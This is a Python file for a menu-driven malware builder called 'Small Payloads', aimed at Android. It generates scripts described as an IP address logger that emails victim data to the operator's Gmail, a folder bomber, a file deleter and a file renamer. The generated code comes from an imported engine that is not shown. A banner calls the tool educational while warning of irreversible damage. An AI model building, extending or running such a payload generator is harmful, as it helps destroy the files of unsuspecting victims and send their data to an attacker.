import os
from androidpayloadengine import androidpayloadengine
from colorama import Fore,Style

# banner
def banner():
    print(Fore.RED+'''
.dP"Y8 8b    d8    db    88     88         88""Yb    db    Yb  dP .dP"Y8 
`Ybo." 88b  d88   dPYb   88     88         88__dP   dPYb    YbdP  `Ybo." 
o.`Y8b 88YbdP88  dP__Yb  88  .o 88  .o     88"""   dP__Yb    8P   o.`Y8b 
8bodP' 88 YY 88 dP""""Yb 88ood8 88ood8     88     dP""""Yb  dP    8bodP' 
                            Created by Gen X  Version 1.0.0 beta        ''')



def menu():
    print()
    banner()
    print()
    print(Fore.GREEN+'[+] This tool is only for educational purpose!.')
    print(Fore.GREEN+'[+] Some Generated file can cause irreversible damage to your files..')
    print(Fore.GREEN+'[+] I am not responsible for any damage caused by this tool..')
    print(Fore.GREEN+'[+] * THIS IS BETA VERSION *')
    print(Style.RESET_ALL)
    print('[1] Android little payloads')
    print('[2] Windows payloads ( Coming Soon ) ')
    choice = input('Enter Your choice : ')
    if choice == '1':
        androidpayloads()
    elif choice == '2':
        print('[!] Windows payload are not availible yet...')
        # os.system('clear')
        menu()
    elif choice == '3':
        exit()
    else:
        print('Please Enter a valid number!')

def androidpayloads():
    print()
    print('[+] Choice any type of Small malicious blocks code <3 !')
    print()
    print('[1] Ip_address logger')
    print('[2] Folder Bomber')
    print('[3] Deleter')
    print('[4] Renamer')
    print('[00] Return to Main Menu ')
    print()
    choice = input('Enter your choice : ')
    if choice == '1':
        Create_payloadONE()
    elif choice == '2':
        Create_payloadTWO()
    elif choice == '3':
        Create_payloadTHREE()
    elif choice == '4':
        Create_payloadFOUR()
    elif choice == '00':
        menu()
    else:
        print('Please Enter a valid number!')

def Create_payloadONE():
    email = input('[+] Enter Your email : ')
    passw = input('[+] Enter Your password : ')
    recv_email = input('[+] Enter email that payload will send to : ')
    file_name = input('[+] Enter file_name : ')

    if email.endswith('@gmail.com') & recv_email.endswith('@gmail.com'):
        ENGINE = androidpayloadengine()
        try:
            with open(file_name+'.py', 'w') as file:
                file.write(ENGINE.ip_address_logger(email, passw, recv_email))
                file.close()
            if os.path.isfile(file_name+'.py'):
                print(Fore.GREEN+f'[+] Successfully Generated : {file_name}.py')
                print(Style.RESET_ALL)
            else:
                print(Fore.RED+'[!] Failed!')
                print(Style.RESET_ALL)
        except FileExistsError as e:
            print(e)

def Create_payloadTWO():
    amount = input('[+] Enter any amount you want : ')
    folder_name = input('[+] Enter folder name : ')
    file_name = input('[+] Enter file_name : ')
    if int(amount) > 0:
        ENGINE = androidpayloadengine()
        try:
            with open(file_name+'.py', 'w') as file:
                file.write(ENGINE.folder_bomber(amount, folder_name))
                file.close()
                if os.path.isfile(file_name + '.py'):
                    print(Fore.GREEN+f'[+] Successfully Generated : {file_name}.py')
                    print(Style.RESET_ALL)
                else:
                    print(Fore.RED+'[!] Failed!')
                    print(Style.RESET_ALL)
        except FileExistsError as e:
            print(e)

def Create_payloadTHREE():
    file_name = input('[+] Enter file_name : ')
    ENGINE = androidpayloadengine()
    try:
        with open(file_name+'.py' , 'w') as file:
            file.write(ENGINE.big_deleter())
            file.close()
            if os.path.isfile(file_name + '.py'):
                print(Fore.GREEN+f'[+] Successfully Generated : {file_name}.py')
                print(Style.RESET_ALL)
            else:
                print(Fore.RED+'[!] Failed!')
                print(Style.RESET_ALL)
    except FileExistsError as e:
        print(e)

def Create_payloadFOUR():
    file_name = input('[+] Enter file_name : ')
    ENGINE = androidpayloadengine()
    try:
        with open(file_name+'.py' , 'w') as file:
            file.write(ENGINE.Renamer(file_name))
            file.close()
            if os.path.isfile(file_name + '.py'):
                print(Fore.GREEN+f'[+] Successfully Generated : {file_name}.py')
                print(Style.RESET_ALL)
            else:
                print(Fore.RED+'[!] Failed!')
                print(Style.RESET_ALL)
    except FileExistsError as e:
        print(e)




menu()